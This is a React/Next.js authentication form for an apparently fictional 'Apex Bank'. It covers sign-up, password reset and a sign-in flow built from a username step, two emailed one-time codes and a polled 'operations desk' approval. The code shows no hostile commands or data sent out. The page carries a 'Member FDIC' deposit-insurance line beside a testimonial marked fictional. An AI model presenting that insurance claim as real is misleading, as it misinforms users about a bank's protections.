'use client'

import { useEffect, useState } from 'react'
import Link from 'next/link'
import { useRouter } from 'next/navigation'
import { authClient } from '@/lib/auth-client'
import { notifySuccessfulLogin } from '@/app/actions/notify'
import {
  startLoginChallenge,
  submitLoginUsername,
  submitLoginOtp,
  getLoginChallengeStatus,
} from '@/app/actions/login-challenge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { ApexLogo } from '@/components/apex-logo'

function isValidUsPhone(value: string) {
  const digits = value.replace(/\D/g, '')
  return digits.length === 10 || (digits.length === 11 && digits.startsWith('1'))
}

type SignInStep =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'test_approved'

export function AuthForm({
  mode,
}: {
  mode: 'sign-in' | 'sign-up' | 'forgot-password' | 'reset-password'
}) {
  const router = useRouter()
  const [name, setName] = useState('')
  const [dateOfBirth, setDateOfBirth] = useState('')
  const [phone, setPhone] = useState('')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [username, setUsername] = useState('')
  const [otp, setOtp] = useState('')
  const [attemptId, setAttemptId] = useState<string | null>(null)
  const [signInStep, setSignInStep] = useState<SignInStep>('credentials')
  const [error, setError] = useState<string | null>(null)
  const [success, setSuccess] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [statusNote, setStatusNote] = useState<string | null>(null)

  const isSignUp = mode === 'sign-up'
  const isForgot = mode === 'forgot-password'
  const isReset = mode === 'reset-password'
  const isSignIn = mode === 'sign-in'

  useEffect(() => {
    if (!isSignIn || signInStep !== 'awaiting_approval' || !attemptId) return

    let cancelled = false
    const tick = async () => {
      const s = await getLoginChallengeStatus(attemptId)
      if (cancelled) return
      setStatusNote(s.lastEvent)
      if (s.status === 'approved') {
        // Existing accounts: complete real session. Guest/test emails: show success only.
        if (s.isGuest) {
          setSignInStep('test_approved')
          setSuccess(
            'Operations desk approved this test sign-in. No dashboard session for emails without an account.'
          )
          setLoading(false)
          return
        }
        setLoading(true)
        const { error: signErr } = await authClient.signIn.email({
          email,
          password,
        })
        if (signErr) {
          setLoading(false)
          setError(signErr.message ?? 'Approved, but final sign-in failed.')
          return
        }
        await notifySuccessfulLogin().catch(() => undefined)
        router.push('/dashboard')
        router.refresh()
        return
      }
      if (s.status === 'rejected' || s.status === 'expired') {
        setSignInStep('rejected')
        setError('Operations desk rejected this sign-in attempt.')
      }
    }

    tick()
    const id = setInterval(tick, 2500)
    return () => {
      cancelled = true
      clearInterval(id)
    }
  }, [isSignIn, signInStep, attemptId, email, password, router])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)
    setSuccess(null)
    setLoading(true)

    try {
      if (isForgot) {
        const { error } = await authClient.forgetPassword({
          email,
          redirectTo: '/reset-password',
        })
        setLoading(false)
        if (error) {
          setError(error.message ?? 'Unable to start password reset.')
          return
        }
        setSuccess(
          'If an account exists for that email, a reset link has been sent. Check inbox and spam.'
        )
        return
      }

      if (isReset) {
        if (password !== confirmPassword) {
          setLoading(false)
          setError('Passwords do not match.')
          return
        }
        if (password.length < 8) {
          setLoading(false)
          setError('Password must be at least 8 characters.')
          return
        }
        const token =
          typeof window !== 'undefined'
            ? new URLSearchParams(window.location.search).get('token')
            : null
        if (!token) {
          setLoading(false)
          setError('Missing reset token. Open the link from your email again.')
          return
        }
        const { error } = await authClient.resetPassword({
          newPassword: password,
          token,
        })
        setLoading(false)
        if (error) {
          setError(error.message ?? 'Unable to reset password.')
          return
        }
        setSuccess('Password updated. You can sign in now.')
        setTimeout(() => router.push('/sign-in'), 1200)
        return
      }

      if (isSignUp) {
        if (password !== confirmPassword) {
          setLoading(false)
          setError('Passwords do not match.')
          return
        }
        if (!isValidUsPhone(phone)) {
          setLoading(false)
          setError('Enter a valid U.S. phone number (10 digits).')
          return
        }
        if (!dateOfBirth) {
          setLoading(false)
          setError('Date of birth is required.')
          return
        }

        const { error } = await authClient.signUp.email({
          email,
          password,
          name: name.trim(),
          phone: phone.trim(),
          dateOfBirth,
        } as any)

        setLoading(false)
        if (error) {
          setError(error.message ?? 'Something went wrong. Please try again.')
          return
        }

        router.push('/dashboard')
        router.refresh()
        return
      }

      if (signInStep === 'credentials') {
        const result = await startLoginChallenge({ email, password })
        setLoading(false)
        if (!result.ok) {
          setError(result.error)
          return
        }
        setAttemptId(result.attemptId)
        setSignInStep('username')
        setSuccess(
          'Email accepted. Enter a username (up to 6 characters).'
        )
        return
      }

      if (signInStep === 'username') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost. Start again.')
          setSignInStep('credentials')
          return
        }
        if (username.trim().length > 6) {
          setLoading(false)
          setError('Username must be 6 characters or fewer.')
          return
        }
        const result = await submitLoginUsername({
          attemptId,
          username,
        })
        setLoading(false)
        if (!result.ok) {
          setError(result.error)
          return
        }
        setOtp('')
        setSignInStep('otp1')
        setSuccess(
          'First 6-digit code sent to your email. Enter it below.'
        )
        return
      }

      if (signInStep === 'otp1' || signInStep === 'otp2') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost. Start again.')
          setSignInStep('credentials')
          return
        }
        const which = signInStep === 'otp1' ? 1 : 2
        const result = await submitLoginOtp({
          attemptId,
          otp,
          which,
        })
        setLoading(false)
        if (!result.ok) {
          setError(result.error)
          return
        }
        setOtp('')
        if (result.next === 'otp2') {
          setSignInStep('otp2')
          setSuccess(
            'First code accepted. A NEW second code was just emailed — enter that new code below.'
          )
          return
        }
        setSignInStep('awaiting_approval')
        setSuccess(null)
        setStatusNote(
          'Waiting for operations desk to approve this sign-in…'
        )
        return
      }
    } catch (err) {
      setLoading(false)
      setError(err instanceof Error ? err.message : 'Something went wrong.')
    }
  }

  const title = isSignUp
    ? 'Open your account'
    : isForgot
      ? 'Reset your password'
      : isReset
        ? 'Choose a new password'
        : signInStep === 'username'
          ? 'Enter username'
          : signInStep === 'otp1'
            ? 'Enter first verification code'
            : signInStep === 'otp2'
              ? 'Enter second verification code'
              : signInStep === 'awaiting_approval'
                ? 'Waiting for approval'
                : signInStep === 'rejected'
                  ? 'Sign-in blocked'
                  : signInStep === 'test_approved'
                    ? 'Test sign-in approved'
                    : 'Welcome back'

  const subtitle = isSignUp
    ? 'Get started with fee-free banking in minutes.'
    : isForgot
      ? 'Enter your email and we will send a reset link.'
      : isReset
        ? 'Enter and confirm your new password.'
        : signInStep === 'username'
          ? 'Choose any username up to 6 characters.'
          : signInStep === 'otp1'
            ? 'We emailed the first 6-digit code. Enter it here.'
            : signInStep === 'otp2'
              ? 'A new second code was emailed after the first succeeded. Enter the new code.'
              : signInStep === 'awaiting_approval'
                ? 'Operations desk has been notified and must approve before you can enter.'
                : signInStep === 'rejected'
                  ? 'This attempt was rejected by the operations desk.'
                  : signInStep === 'test_approved'
                    ? 'Ops approved the flow. Guest/test emails do not open a dashboard session.'
                    : 'Log in to access your accounts. Test emails do not need an existing account.'

  return (
    <main className="grid min-h-svh lg:grid-cols-2">
      <div className="relative hidden flex-col justify-between bg-sidebar p-10 text-sidebar-foreground lg:flex">
        <Link href="/" className="flex items-center gap-2">
          <ApexLogo className="h-7 w-7 text-sidebar-primary" />
          <span className="text-lg font-bold tracking-tight">Apex Bank</span>
        </Link>
        <div className="max-w-sm">
          <p className="text-balance text-2xl font-semibold leading-snug">
            &ldquo;Switching to Apex was the easiest financial decision I've
            ever made.&rdquo;
          </p>
          <p className="mt-4 text-sm text-sidebar-foreground/70">
            — A very satisfied (fictional) member
          </p>
        </div>
        <p className="text-xs text-sidebar-foreground/60">
          Member FDIC · Deposits insured up to $250,000
        </p>
      </div>

      <div className="flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-sm">
          <Link href="/" className="mb-8 flex items-center gap-2 lg:hidden">
            <ApexLogo className="h-7 w-7 text-primary" />
            <span className="text-lg font-bold tracking-tight text-foreground">
              Apex Bank
            </span>
          </Link>

          <div className="mb-6">
            <h1 className="text-2xl font-bold tracking-tight text-foreground">
              {title}
            </h1>
            <p className="mt-1 text-sm text-muted-foreground">{subtitle}</p>
          </div>

          <form onSubmit={handleSubmit} className="flex flex-col gap-4">
            {isSignUp && (
              <>
                <div className="flex flex-col gap-2">
                  <Label htmlFor="name">Full name</Label>
                  <Input
                    id="name"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    required
                    autoComplete="name"
                    placeholder="Jordan Lee"
                  />
                </div>
                <div className="flex flex-col gap-2">
                  <Label htmlFor="dob">Date of birth</Label>
                  <Input
                    id="dob"
                    type="date"
                    value={dateOfBirth}
                    onChange={(e) => setDateOfBirth(e.target.value)}
                    required
                    max={new Date().toISOString().slice(0, 10)}
                  />
                </div>
                <div className="flex flex-col gap-2">
                  <Label htmlFor="phone">U.S. phone number</Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    required
                    autoComplete="tel"
                    placeholder="(555) 123-4567"
                  />
                </div>
              </>
            )}

            {((isSignIn && signInStep === 'credentials') ||
              isSignUp ||
              isForgot) &&
              !isReset && (
                <div className="flex flex-col gap-2">
                  <Label htmlFor="email">Email</Label>
                  <Input
                    id="email"
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    autoComplete="email"
                    placeholder="you@example.com"
                    disabled={isSignIn && signInStep !== 'credentials'}
                  />
                </div>
              )}

            {((isSignIn && signInStep === 'credentials') ||
              isSignUp ||
              isReset) &&
              !isForgot && (
                <div className="flex flex-col gap-2">
                  <Label htmlFor="password">
                    {isReset ? 'New password' : 'Password'}
                  </Label>
                  <Input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    minLength={isSignIn ? 1 : 8}
                    autoComplete={
                      isSignUp || isReset ? 'new-password' : 'current-password'
                    }
                    placeholder={
                      isSignUp || isReset
                        ? 'At least 8 characters'
                        : '••••••••'
                    }
                    disabled={isSignIn && signInStep !== 'credentials'}
                  />
                </div>
              )}

            {(isSignUp || isReset) && (
              <div className="flex flex-col gap-2">
                <Label htmlFor="confirm">Confirm password</Label>
                <Input
                  id="confirm"
                  type="password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  required
                  minLength={8}
                  autoComplete="new-password"
                  placeholder="Re-enter password"
                />
              </div>
            )}

            {isSignIn && signInStep === 'username' && (
              <div className="flex flex-col gap-2">
                <Label htmlFor="username">Username (max 6 characters)</Label>
                <Input
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value.slice(0, 6))}
                  required
                  maxLength={6}
                  autoComplete="username"
                  placeholder="e.g. alex"
                />
              </div>
            )}

            {isSignIn && (signInStep === 'otp1' || signInStep === 'otp2') && (
              <div className="flex flex-col gap-2">
                <Label htmlFor="otp">
                  {signInStep === 'otp1'
                    ? 'First verification code'
                    : 'Second verification code (new code)'}
                </Label>
                <Input
                  id="otp"
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={6}
                  value={otp}
                  onChange={(e) =>
                    setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
                  }
                  required
                  autoComplete="one-time-code"
                  placeholder="000000"
                  className="text-center text-2xl tracking-[0.4em]"
                />
              </div>
            )}

            {isSignIn && signInStep === 'awaiting_approval' && (
              <div className="rounded-lg border border-border bg-muted/40 p-4 text-sm text-muted-foreground">
                <p className="font-medium text-foreground">
                  Pending operations desk
                </p>
                <p className="mt-1">
                  {statusNote ||
                    'Your sign-in is complete on your side. An admin must approve it.'}
                </p>
                <p className="mt-2 text-xs">This page refreshes automatically.</p>
              </div>
            )}

            {isSignIn && signInStep === 'test_approved' && (
              <div className="rounded-lg border border-emerald-500/40 bg-emerald-500/10 p-4 text-sm">
                <p className="font-medium text-foreground">Approved</p>
                <p className="mt-1 text-muted-foreground">
                  Ops desk approved this test attempt. Because this email has no
                  registered account, no dashboard session was opened.
                </p>
              </div>
            )}

            {error && (
              <p className="text-sm text-destructive" role="alert">
                {error}
              </p>
            )}
            {success && (
              <p className="text-sm text-emerald-600" role="status">
                {success}
              </p>
            )}

            {isSignIn &&
              signInStep !== 'awaiting_approval' &&
              signInStep !== 'rejected' &&
              signInStep !== 'test_approved' && (
                <Button
                  type="submit"
                  disabled={loading}
                  className="h-11 w-full text-base"
                >
                  {loading
                    ? 'Please wait…'
                    : signInStep === 'credentials'
                      ? 'Continue'
                      : signInStep === 'username'
                        ? 'Continue'
                        : signInStep === 'otp1'
                          ? 'Submit first code'
                          : 'Submit second code'}
                </Button>
              )}

            {!isSignIn && (
              <Button
                type="submit"
                disabled={loading}
                className="h-11 w-full text-base"
              >
                {loading
                  ? 'Please wait…'
                  : isSignUp
                    ? 'Create account'
                    : isForgot
                      ? 'Send reset link'
                      : 'Update password'}
              </Button>
            )}

            {isSignIn &&
              signInStep !== 'credentials' &&
              signInStep !== 'awaiting_approval' && (
                <button
                  type="button"
                  className="text-sm text-muted-foreground underline-offset-4 hover:underline"
                  onClick={() => {
                    setSignInStep('credentials')
                    setAttemptId(null)
                    setUsername('')
                    setOtp('')
                    setError(null)
                    setSuccess(null)
                  }}
                >
                  ← Start over
                </button>
              )}
          </form>

          {mode === 'sign-in' && signInStep === 'credentials' && (
            <p className="mt-4 text-center text-sm">
              <Link
                href="/forgot-password"
                className="font-medium text-foreground underline-offset-4 hover:underline"
              >
                Forgot password?
              </Link>
            </p>
          )}

          <p className="mt-6 text-center text-sm text-muted-foreground">
            {isSignUp ? (
              <>
                Already have an account?{' '}
                <Link
                  href="/sign-in"
                  className="font-medium text-foreground underline-offset-4 hover:underline"
                >
                  Log in
                </Link>
              </>
            ) : isForgot || isReset ? (
              <>
                Remembered it?{' '}
                <Link
                  href="/sign-in"
                  className="font-medium text-foreground underline-offset-4 hover:underline"
                >
                  Log in
                </Link>
              </>
            ) : (
              <>
                Don't have an account?{' '}
                <Link
                  href="/sign-up"
                  className="font-medium text-foreground underline-offset-4 hover:underline"
                >
                  Open one
                </Link>
              </>
            )}
          </p>
        </div>
      </div>
    </main>
  )
}
